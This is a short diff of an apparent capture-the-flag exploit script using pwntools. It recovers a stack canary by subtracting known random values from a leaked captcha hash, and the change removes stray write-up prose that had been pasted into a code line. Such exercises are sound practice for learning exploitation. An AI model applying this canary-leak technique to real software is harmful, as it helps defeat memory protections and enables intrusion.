@@ -129,7 +129,7 @@ for i in range(0, 8):
 
 hashWithoutCookie = rands[0]+rands[4]+rands[1]-rands[2]+rands[6]-rands[5]+rands[3]
 
-p.recvuntil(b"captcha : ")f calculation with the stack canary. Then the program prints that calculation to us! Thats really important, because if we do the
+p.recvuntil(b"captcha : ")
 wholeHash = int(p.recvline())
 cookie = (wholeHash - hashWithoutCookie) & 0xffffffff
 p.sendline(str(wholeHash))
